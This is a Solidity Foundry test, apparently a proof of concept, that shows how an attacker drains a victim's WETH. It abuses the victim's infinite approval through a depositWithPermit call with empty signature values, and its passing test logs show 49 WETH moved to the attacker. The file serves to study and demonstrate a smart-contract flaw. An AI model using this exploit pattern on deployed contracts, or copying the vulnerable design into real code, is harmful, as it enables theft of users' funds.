// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import { Test, console } from "forge-std/Test.sol";
import { Bank, WETH } from "../src/WETHPermit.sol";

contract WETHPermitTest is Test {
    Bank bank;
    WETH weth;
    address victim;
    address attacker;

    function setUp() public {
        weth = new WETH();
        bank = new Bank(address(weth));

        victim = vm.addr(1);
        attacker = vm.addr(2);
        vm.deal(victim, 50 ether);
        vm.prank(victim);
        weth.deposit{ value: 50 ether }();
    }

    function testAttackerCanStealWETH() public {
        setUp();

        // victim gives infinite approval to the bank and deposits 1 WETH
        vm.startPrank(victim);
        weth.approve(address(bank), type(uint256).max);
        bank.deposit(1e18);
        vm.stopPrank();

        console.log(
            "[PRE-ATTACK]:  WETH balance of victim: ",
            weth.balanceOf(victim)
        );
        console.log(
            "[PRE-ATTACK]:  WETH balance of attacker: ",
            weth.balanceOf(attacker)
        );

        uint256 balance = weth.balanceOf(victim);
        vm.startPrank(attacker);
        // attacker uses victim's WETH allowance to credit himself all the remaining WETH from the victim's wallet (49 WETH left)
        bank.depositWithPermit(victim, attacker, balance, 0, 0, "", "");
        uint256 amountStolen = bank.getBalance(attacker);
        bank.withdraw(amountStolen);
        vm.stopPrank();

        console.log(
            "[POST-ATTACK]: WETH balance of victim: ",
            weth.balanceOf(victim)
        );
        console.log(
            "[POST-ATTACK]: WETH balance of attacker: ",
            weth.balanceOf(attacker)
        );

        assertEq(amountStolen, 49 ether);
        assertEq(weth.balanceOf(victim), 0); // victim has been stolen all his weth because of the approval
        assertEq(weth.balanceOf(attacker), 49 ether);
    }
}

// forge test --via-ir --mt testAttackerCanStealWETH -vv

/*
Ran 1 test for test/WETHPermitTest.t.sol:WETHPermitTest
[PASS] testAttackerCanStealWETH() (gas: 959697)
Logs:
  [PRE-ATTACK]:  WETH balance of victim:  49000000000000000000
  [PRE-ATTACK]:  WETH balance of attacker:  0
  [POST-ATTACK]: WETH balance of victim:  0
  [POST-ATTACK]: WETH balance of attacker:  49000000000000000000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.71ms (375.33µs CPU time)
*/
